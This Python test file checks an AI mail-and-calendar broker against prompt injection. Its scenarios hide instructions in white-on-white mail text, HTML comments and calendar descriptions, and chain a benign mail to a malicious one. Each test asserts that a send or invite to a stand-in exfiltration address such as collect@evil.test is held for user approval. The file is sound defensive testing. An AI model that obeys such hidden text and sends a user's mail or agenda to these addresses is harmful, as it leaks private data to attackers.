"""Attacks 7-10: hidden text in mail and invites; a two-step chain across messages."""

from broker.rules.models import Verdict
from tests.conftest import WorldFactory

EXFIL = "collect@evil.test"


def test_07_white_on_white_and_html_comment_in_mail(world: WorldFactory) -> None:
    w = world(messages=["m_hidden"])
    body = w.call("read_message", message_id="m_hidden").data["body"]
    # The gate does not strip hidden text; the agent sees it. Taint is what guards the send.
    assert "<!--" in body
    assert w.session.tainted
    result = w.call("send_mail", to=[EXFIL], subject="Invoices", body="attached")
    assert result.verdict == Verdict.ASK
    assert w.approver.requests[0].recipients == [EXFIL]
    assert w.backend.sent == []


def test_08_html_comment_in_calendar_description(world: WorldFactory) -> None:
    w = world(events=["e_hidden"])
    w.call("list_events")
    assert w.session.tainted
    result = w.call(
        "create_event",
        title="Agenda sync",
        start="s",
        end="e",
        attendees=[EXFIL],
        description="the user's agenda",
    )
    assert result.verdict == Verdict.ASK
    [prompt] = w.approver.requests
    assert prompt.recipients == [EXFIL]
    assert prompt.body_preview == "the user's agenda"
    assert w.backend.created_events == []


def test_09_benign_mail_points_to_malicious_one(world: WorldFactory) -> None:
    w = world(messages=["m_chain1", "m_chain2"])
    w.call("read_message", message_id="m_chain1")  # from Bob, a known contact
    assert not w.session.tainted
    w.call("search_mail", query="Portal access")
    w.call("read_message", message_id="m_chain2")  # from an unknown portal address
    assert w.session.tainted
    result = w.call(
        "send_mail", to=["verify@portal-access.test"], subject="Calendar", body="next week"
    )
    assert result.verdict == Verdict.ASK
    assert w.backend.sent == []


def test_10_taint_carries_across_later_clean_steps(world: WorldFactory) -> None:
    w = world(messages=["m_chain2", "m_chain1", "m_lunch"], events=["e_standup"])
    w.call("read_message", message_id="m_chain2")
    w.call("read_message", message_id="m_chain1")
    w.call("read_message", message_id="m_lunch")
    w.call("list_events")
    w.call("search_mail")
    assert w.session.tainted
    assert w.session.taint_reason == "read a message from an unknown sender"
    result = w.call("create_event", title="Focus", start="s", end="e")
    assert result.verdict == Verdict.ASK  # even own-calendar, no attendees: tainted asks
    assert w.backend.created_events == []
